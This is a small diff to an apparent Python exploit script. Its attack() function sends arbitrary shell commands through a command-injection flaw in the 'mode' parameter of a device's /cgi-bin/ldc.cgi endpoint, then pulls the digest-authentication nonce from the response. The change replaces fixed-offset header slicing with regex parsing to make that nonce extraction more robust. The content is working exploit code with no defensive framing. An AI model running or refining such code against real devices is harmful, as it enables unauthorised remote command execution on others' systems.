@@ -11,6 +11,7 @@ import requests
 import hashlib
 import argparse
 import sys
+import re
 
 def attack(target, cmd):
     url = 'http://{0}/cgi-bin/ldc.cgi?mode=; {1} ;'.format(target, cmd)
@@ -18,7 +19,9 @@ def attack(target, cmd):
     ###### Get nonce
     try:
         resp = requests.get(url)
-        nonce = resp.headers['WWW-Authenticate'][50:82]
+        reg = re.compile('(\w+)[=] ?"?(\w+)"?')
+        auth_headers = dict(reg.findall(resp.headers['WWW-Authenticate']))
+        nonce = auth_headers["nonce"]
     except:
         print('[!] Could not reach server.')
         sys.exit(0)
